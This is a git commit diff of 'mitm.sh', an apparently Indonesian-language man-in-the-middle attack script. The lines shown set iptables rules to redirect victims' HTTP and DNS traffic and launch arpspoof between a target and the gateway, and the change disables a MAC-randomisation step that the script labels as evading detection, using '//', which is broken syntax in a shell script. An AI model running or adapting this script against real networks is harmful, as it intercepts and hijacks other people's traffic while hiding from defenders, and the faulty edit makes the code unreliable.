b3c1ee41a8c8ea7860fd5224d0b049803f0b385d
gpt-kfai <admin@kangwifi.eu.org>
2025-03-30 10:09:54 +0700

    Add files via upload

--- mitm.sh
+++ mitm.sh
@@ -90,10 +90,10 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
 
 # Menyamarkan MAC Address agar sulit dideteksi
-ifconfig $interface down
-macchanger -r $interface
-ifconfig $interface up
-echo -e "$green[✔] MAC Address diacak untuk menghindari deteksi"
+// ifconfig $interface down
+// macchanger -r $interface
+// ifconfig $interface up
+// echo -e "$green[✔] MAC Address diacak untuk menghindari deteksi"
 
 # Menjalankan arpspoof
 xterm -hold -title "ARP Spoof: Target -> Gateway" -e "arpspoof -i $interface -t $ipt $ipg > /dev/null 2>&1" &
